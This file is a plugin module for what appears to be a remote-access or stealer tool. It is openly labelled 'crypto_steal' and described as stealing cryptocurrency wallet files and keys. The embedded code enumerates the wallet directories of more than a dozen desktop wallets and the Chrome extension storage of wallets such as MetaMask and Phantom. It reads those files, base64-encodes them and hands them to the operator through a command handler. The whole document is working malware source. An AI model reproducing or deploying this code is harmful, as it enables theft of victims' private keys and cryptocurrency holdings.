PLUGIN = {"name": "crypto_steal", "desc": "Steal cryptocurrency wallet files and keys", "deps": [], "size": 3.0}

STUB_CODE = r"""
import os, base64, json

# Common wallet file patterns and locations
_WALLET_PATHS = {
    "Bitcoin": [r"AppData\Roaming\Bitcoin\wallet.dat", r"AppData\Roaming\Bitcoin\wallets"],
    "Ethereum": [r"AppData\Roaming\Ethereum\keystore", r"AppData\Roaming\Ethereum\wallets"],
    "Monero": [r"AppData\Roaming\monero\wallet", r"AppData\Roaming\monero\wallets"],
    "Litecoin": [r"AppData\Roaming\Litecoin\wallet.dat"],
    "Dogecoin": [r"AppData\Roaming\Dogecoin\wallet.dat"],
    "Dash": [r"AppData\Roaming\DashCore\wallet.dat"],
    "Zcash": [r"AppData\Roaming\Zcash\wallet.dat"],
    "Cardano": [r"AppData\Roaming\Daedalus\wallets"],
    "Electrum": [r"AppData\Roaming\Electrum\wallets"],
    "Exodus": [r"AppData\Roaming\Exodus\exodus.wallet"],
    "Atomic": [r"AppData\Roaming\atomic\Local Storage\leveldb"],
    "Jaxx": [r"AppData\Roaming\jaxx\Local Storage\leveldb"],
    "MetaMask": [r"AppData\Roaming\Mozilla\Firefox\Profiles", r"AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    "Binance": [r"AppData\Roaming\Binance\wallets"],
}

def _find_wallets():
    found = []
    home = os.path.expanduser("~")
    for name, paths in _WALLET_PATHS.items():
        for p in paths:
            full = os.path.join(home, p)
            if os.path.isfile(full):
                try:
                    with open(full, "rb") as f: data = f.read(1024*1024)
                    found.append({"wallet": name, "path": full, "size": len(data), "data_b64": base64.b64encode(data).decode()})
                except: pass
            elif os.path.isdir(full):
                try:
                    for root, dirs, files in os.walk(full):
                        for fname in files:
                            fpath = os.path.join(root, fname)
                            try:
                                with open(fpath, "rb") as f: data = f.read(512*1024)
                                found.append({"wallet": name, "path": fpath, "size": len(data),
                                              "data_b64": base64.b64encode(data).decode() if len(data) < 100*1024 else ""})
                            except: pass
                            if len(found) > 20: break
                        if len(found) > 20: break
                except: pass
    return found

def _find_browser_extensions():
    found = []
    home = os.path.expanduser("~")
    # Chrome extensions
    chrome_ext = os.path.join(home, r"AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings")
    wallet_exts = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
        "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask Beta",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
        "aholpfdialjgjfhomihkjbmgjidlcdno": "Keplr",
        "dmkamcknogkgcdfhhbddcghachkejeap": "Exodus",
        "cmedhionkhpnakcndndgjdbohmhepckk": "TronLink",
        "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Coinbase Wallet",
        "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
    }
    if os.path.isdir(chrome_ext):
        for ext_id, name in wallet_exts.items():
            ext_dir = os.path.join(chrome_ext, ext_id)
            if os.path.isdir(ext_dir):
                for root, dirs, files in os.walk(ext_dir):
                    for f in files:
                        if f.endswith(".log"):
                            fpath = os.path.join(root, f)
                            try:
                                with open(fpath, "rb") as fh: data = fh.read(500*1024)
                                found.append({"wallet": f"{name}_ext", "path": fpath, "size": len(data)})
                            except: pass
    return found

def _cmd_crypto_steal(m):
    try:
        wallets = _find_wallets()
        ext_data = _find_browser_extensions()
        all_items = wallets + ext_data
        if not all_items:
            return {"output": "[!] No wallet files found"}
        summary = {}
        for item in all_items:
            name = item["wallet"]
            if name not in summary: summary[name] = 0
            summary[name] += 1
        lines = [f"[+] Found {len(all_items)} wallet items:"]
        for name, count in sorted(summary.items()):
            lines.append(f"  {name}: {count} file(s)")
        data_items = [i for i in all_items if i.get("data_b64")]
        return {"output": "\n".join(lines), "wallets": all_items[:30]}
    except Exception as e: return {"output": f"[!] Crypto steal error: {e}"}
_CMDS["crypto_steal"] = _cmd_crypto_steal
"""

def get_commands():
    return {"crypto_steal": "_cmd_crypto_steal"}
